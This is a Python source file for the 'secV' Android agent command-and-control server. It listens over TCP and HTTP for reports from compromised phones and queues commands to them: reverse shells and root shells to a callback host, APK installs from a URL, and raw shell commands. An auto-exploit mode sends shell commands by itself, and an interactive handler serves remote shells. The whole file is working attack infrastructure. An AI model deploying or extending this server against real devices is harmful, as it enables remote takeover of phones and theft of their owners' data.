#!/usr/bin/env python3
"""
secV Agent C2 Server
Receives JSON reports from secv_agent (shell or binary), stores sessions,
and allows issuing exploit commands interactively or automatically.

Usage:
  python3 c2_server.py [--port 8889] [--http-port 8890] [--auto-exploit] [--lhost <ip>] [--lport 4444]

Modes:
  TCP listener  — receives direct agent callbacks (nc/socket)
  HTTP server   — receives POST /agent from curl-based agents
  Interactive   — REPL to manage sessions and issue commands
"""

import argparse
import json
import socket
import sys
import threading
import time
import os
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from typing import Dict, List, Optional

# ── Session store ─────────────────────────────────────────────────────────────

_sessions: Dict[str, Dict] = {}   # addr → session
_sessions_lock = threading.Lock()
_session_cmds: Dict[str, str] = {}  # addr → pending command


def _register_session(addr: str, report: Dict) -> str:
    sid = f"{addr}-{datetime.now().strftime('%H%M%S')}"
    dev = report.get("device", {})
    with _sessions_lock:
        _sessions[addr] = {
            "id":          sid,
            "addr":        addr,
            "time":        datetime.now().isoformat(),
            "report":      report,
            "model":       dev.get("model", "?"),
            "android":     dev.get("android", "?"),
            "sdk":         dev.get("sdk", "?"),
            "root":        dev.get("root", "none"),
            "root_bin":    dev.get("root_bin", ""),
            "selinux":     dev.get("selinux", "?"),
            "ip":          report.get("network", {}).get("ip", "?"),
            "patch":       dev.get("security_patch", ""),
            "chipset":     dev.get("chipset", ""),
            "agent":       report.get("agent", "?"),
            "mode":        report.get("mode", "recon"),
            "cmd_history": [],
        }
    return sid


def _print_session(sess: Dict):
    root = sess["root"]
    rooted = "YES" if "rooted" in root else "no"
    print(f"  [{sess['addr']}]  {sess['model']} / Android {sess['android']} / "
          f"SDK {sess['sdk']} / patch={sess['patch']}")
    print(f"    Root:{rooted}  bin={sess['root_bin']}  SELinux={sess['selinux']}")
    print(f"    WiFi IP={sess['ip']}  chipset={sess['chipset']}")
    print(f"    Agent={sess['agent']}  Received={sess['time']}")


def _auto_exploit_cmd(report: Dict, lhost: str, lport: int) -> Optional[str]:
    dev      = report.get("device", {})
    root_st  = dev.get("root", "none")
    root_bin = dev.get("root_bin", "")
    mode     = report.get("mode", "recon")
    if mode not in ("exploit", "c2"):
        return None
    if "rooted" in root_st and root_bin:
        return f"ROOT_SHELL:{lhost}:{lport}"
    return f"SHELL:{lhost}:{lport}"


# ── TCP C2 listener ───────────────────────────────────────────────────────────

def _handle_tcp_client(conn: socket.socket, addr_tuple, auto_exploit: bool,
                        lhost: str, lport: int):
    addr = f"{addr_tuple[0]}:{addr_tuple[1]}"
    print(f"\n[+] TCP agent connected: {addr}")
    try:
        data = b""
        conn.settimeout(15)
        try:
            while True:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                data += chunk
                if b"\n" in chunk:
                    break
        except socket.timeout:
            pass

        raw = data.decode("utf-8", errors="replace").strip()
        if not raw:
            print(f"[-] Empty data from {addr}")
            return

        try:
            report = json.loads(raw)
        except json.JSONDecodeError:
            print(f"[-] JSON parse error from {addr}: {raw[:120]}")
            return

        sid = _register_session(addr, report)
        dev = report.get("device", {})
        print(f"[+] Session {sid}: {dev.get('model','?')} / "
              f"Android {dev.get('android','?')} / root={dev.get('root','none')}")

        # Check for pending manual command
        pending = None
        with _sessions_lock:
            pending = _session_cmds.pop(addr, None)

        cmd = pending
        if not cmd and auto_exploit:
            cmd = _auto_exploit_cmd(report, lhost, lport)
            if cmd:
                print(f"[*] Auto-exploit → {cmd}")

        if cmd:
            payload = json.dumps({"cmd": cmd}, separators=(',', ':')).encode() + b"\n"
            try:
                conn.sendall(payload)
                with _sessions_lock:
                    _sessions[addr]["cmd_history"].append(cmd)
                time.sleep(2)
            except Exception as e:
                print(f"[-] Send failed: {e}")

    finally:
        conn.close()


def _tcp_server(port: int, auto_exploit: bool, lhost: str, lport: int):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port))
    srv.listen(10)
    print(f"[*] TCP C2 listening on 0.0.0.0:{port}")
    while True:
        try:
            conn, addr = srv.accept()
            t = threading.Thread(target=_handle_tcp_client,
                                 args=(conn, addr, auto_exploit, lhost, lport),
                                 daemon=True)
            t.start()
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"[-] TCP accept error: {e}")


# ── HTTP C2 handler ───────────────────────────────────────────────────────────

class _AgentHTTPHandler(BaseHTTPRequestHandler):
    auto_exploit: bool = False
    lhost: str = "127.0.0.1"
    lport: int = 4444

    def log_message(self, fmt, *args):
        pass  # suppress default HTTP log

    def do_GET(self):
        client_ip = self.client_address[0]
        if self.path in ("/cmd", "/cmd/"):
            # HTTP polling C2 — serve queued command for this device
            # Key by IP only (polling clients don't keep a stable port)
            pending = None
            with _sessions_lock:
                for key in list(_session_cmds.keys()):
                    if key.startswith(client_ip):
                        pending = _session_cmds.pop(key)
                        break
            if pending:
                body = pending.encode()
                print(f"\n[*] HTTP poll cmd → {client_ip}: {pending[:60]}")
            else:
                body = b""
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        # Default status page
        with _sessions_lock:
            count = len(_sessions)
        body = json.dumps({"sessions": count, "status": "ok"}).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self):
        client_ip = self.client_address[0]
        if self.path in ("/result", "/result/"):
            # HTTP polling C2 — receive command output
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length)
            output = body.decode("utf-8", errors="replace").strip()
            print(f"\n[poll-result {client_ip}]\n{output}\n")
            self.send_response(200)
            self.end_headers()
            return
        if self.path not in ("/agent", "/agent/"):
            self.send_response(404)
            self.end_headers()
            return
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length)
        addr = f"{self.client_address[0]}:{self.client_address[1]}"
        print(f"\n[+] HTTP agent callback: {addr}")
        try:
            report = json.loads(body.decode("utf-8", errors="replace"))
        except Exception as e:
            print(f"[-] JSON error: {e}")
            self.send_response(400)
            self.end_headers()
            return

        sid = _register_session(addr, report)
        dev = report.get("device", {})
        print(f"[+] Session {sid}: {dev.get('model','?')} / "
              f"Android {dev.get('android','?')} / root={dev.get('root','none')}")

        pending = None
        with _sessions_lock:
            pending = _session_cmds.pop(addr, None)

        cmd = pending
        if not cmd and self.auto_exploit:
            cmd = _auto_exploit_cmd(report, self.lhost, self.lport)
            if cmd:
                print(f"[*] Auto-exploit → {cmd}")

        if cmd:
            resp_body = json.dumps({"cmd": cmd}, separators=(',', ':')).encode()
            with _sessions_lock:
                _sessions[addr]["cmd_history"].append(cmd)
        else:
            resp_body = b"{}"

        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(resp_body)))
        self.end_headers()
        self.wfile.write(resp_body)

def _http_server(http_port: int, auto_exploit: bool, lhost: str, lport: int):
    _AgentHTTPHandler.auto_exploit = auto_exploit
    _AgentHTTPHandler.lhost = lhost
    _AgentHTTPHandler.lport = lport
    srv = HTTPServer(("0.0.0.0", http_port), _AgentHTTPHandler)
    print(f"[*] HTTP C2 listening on 0.0.0.0:{http_port}  (POST /agent)")
    srv.serve_forever()


# ── Interactive REPL ──────────────────────────────────────────────────────────

_HELP = """
Commands:
  sessions          List all agent sessions
  info <addr>       Full report for session <addr>
  cmd <addr> <cmd>  Queue a command for next TCP callback from <addr>
  sh <addr> <cmd>   Queue: SH:<cmd>
  shell <addr> <h> <p>      Queue: SHELL:<h>:<p>
  rootshell <addr> <h> <p>  Queue: ROOT_SHELL:<h>:<p>
  apk <addr> <url>          Queue: APK:<url>
  poll <ip> <cmd>   Queue a raw shell command for HTTP-polling agent at <ip>
                    Agent polls GET /cmd and POSTs result to /result
  clear             Clear all sessions
  help              This menu
  quit / exit       Exit C2 server

Note: TCP callbacks use <ip>:<port> as addr key.
      HTTP poll callbacks use just <ip> (port changes each request).
"""


def _repl(lhost: str, lport: int):
    print("[*] Interactive REPL ready. Type 'help' for commands.")
    while True:
        try:
            line = input("secV-C2> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[*] Shutting down.")
            os._exit(0)

        if not line:
            continue
        parts = line.split(None, 3)
        cmd = parts[0].lower()

        if cmd in ("quit", "exit"):
            os._exit(0)

        elif cmd == "help":
            print(_HELP)

        elif cmd == "sessions":
            with _sessions_lock:
                sess_list = list(_sessions.values())
            if not sess_list:
                print("  No sessions yet.")
            else:
                for s in sess_list:
                    _print_session(s)

        elif cmd == "info" and len(parts) >= 2:
            addr = parts[1]
            with _sessions_lock:
                s = _sessions.get(addr)
            if s:
                print(json.dumps(s["report"], indent=2))
            else:
                print(f"  Session not found: {addr}")

        elif cmd == "cmd" and len(parts) >= 3:
            addr = parts[1]
            command = parts[2] if len(parts) == 3 else " ".join(parts[2:])
            with _sessions_lock:
                _session_cmds[addr] = command
            print(f"  [*] Queued for {addr}: {command}")

        elif cmd == "sh" and len(parts) >= 3:
            addr = parts[1]
            shell_cmd = " ".join(parts[2:])
            with _sessions_lock:
                _session_cmds[addr] = f"SH:{shell_cmd}"
            print(f"  [*] Queued SH:{shell_cmd} for {addr}")

        elif cmd == "shell" and len(parts) >= 4:
            addr, host, port = parts[1], parts[2], parts[3]
            with _sessions_lock:
                _session_cmds[addr] = f"SHELL:{host}:{port}"
            print(f"  [*] Queued SHELL:{host}:{port} for {addr}")

        elif cmd == "rootshell" and len(parts) >= 4:
            addr, host, port = parts[1], parts[2], parts[3]
            with _sessions_lock:
                _session_cmds[addr] = f"ROOT_SHELL:{host}:{port}"
            print(f"  [*] Queued ROOT_SHELL:{host}:{port} for {addr}")

        elif cmd == "apk" and len(parts) >= 3:
            addr = parts[1]
            url = parts[2]
            with _sessions_lock:
                _session_cmds[addr] = f"APK:{url}"
            print(f"  [*] Queued APK:{url} for {addr}")

        elif cmd == "poll" and len(parts) >= 3:
            ip = parts[1]
            poll_cmd = " ".join(parts[2:])
            # Key by IP only — polling clients use dynamic ports
            with _sessions_lock:
                _session_cmds[ip] = poll_cmd
            print(f"  [*] Queued poll cmd for {ip}: {poll_cmd}")

        elif cmd == "clear":
            with _sessions_lock:
                _sessions.clear()
                _session_cmds.clear()
            print("  [*] Sessions cleared.")

        else:
            print(f"  Unknown command: {line}. Type 'help'.")


# ── Shell payload handler (custom Payload.smali protocol) ─────────────────────

def _shell_handler(conn: socket.socket, addr: str):
    print(f"\n[+] Shell callback from {addr}")
    print(f"    Type commands. Output ends with '---END---'. Ctrl-C to disconnect.\n")
    f = conn.makefile("rwb", buffering=0)
    try:
        while True:
            try:
                cmd = input(f"shell@{addr}> ").strip()
            except (EOFError, KeyboardInterrupt):
                print()
                break
            if not cmd:
                continue
            if cmd in ("exit", "quit"):
                break
            f.write((cmd + "\n").encode())
            f.flush()
            # Read until ---END---
            while True:
                line = f.readline()
                if not line:
                    print("[*] Connection closed by remote")
                    return
                line = line.decode("utf-8", errors="replace").rstrip("\n")
                if line == "---END---":
                    break
                print(line)
    finally:
        conn.close()
        print(f"[*] Shell session {addr} closed")


def _shell_server(port: int):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port))
    srv.listen(5)
    print(f"[*] Shell handler listening on 0.0.0.0:{port}  (custom Payload protocol)")
    while True:
        try:
            conn, addr_tuple = srv.accept()
            addr = f"{addr_tuple[0]}:{addr_tuple[1]}"
            t = threading.Thread(target=_shell_handler, args=(conn, addr), daemon=False)
            t.start()
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"[-] Shell accept error: {e}")


# ── Entry point ───────────────────────────────────────────────────────────────

def main():
    ap = argparse.ArgumentParser(description="secV Agent C2 Server")
    ap.add_argument("--port",       type=int, default=8889,  help="TCP C2 port")
    ap.add_argument("--http-port",  type=int, default=8890,  help="HTTP C2 port")
    ap.add_argument("--lhost",      default="",              help="Callback IP for reverse shells")
    ap.add_argument("--lport",      type=int, default=4444,  help="Callback port for reverse shells")
    ap.add_argument("--auto-exploit", action="store_true",   help="Auto-issue SHELL/ROOT_SHELL on callback")
    ap.add_argument("--no-http",    action="store_true",     help="Disable HTTP listener")
    ap.add_argument("--no-tcp",     action="store_true",     help="Disable TCP listener")
    ap.add_argument("--shell-port", type=int, default=0,     help="Custom shell payload port (Payload.smali)")
    args = ap.parse_args()

    lhost = args.lhost
    if not lhost:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            lhost = s.getsockname()[0]
            s.close()
        except Exception:
            lhost = "127.0.0.1"

    print(f"[*] secV C2 Server  lhost={lhost}:{args.lport}  auto_exploit={args.auto_exploit}")

    if not args.no_tcp:
        t = threading.Thread(target=_tcp_server,
                             args=(args.port, args.auto_exploit, lhost, args.lport),
                             daemon=True)
        t.start()

    if not args.no_http:
        t2 = threading.Thread(target=_http_server,
                              args=(args.http_port, args.auto_exploit, lhost, args.lport),
                              daemon=True)
        t2.start()

    if args.shell_port:
        t3 = threading.Thread(target=_shell_server, args=(args.shell_port,), daemon=True)
        t3.start()

    _repl(lhost, args.lport)


if __name__ == "__main__":
    main()
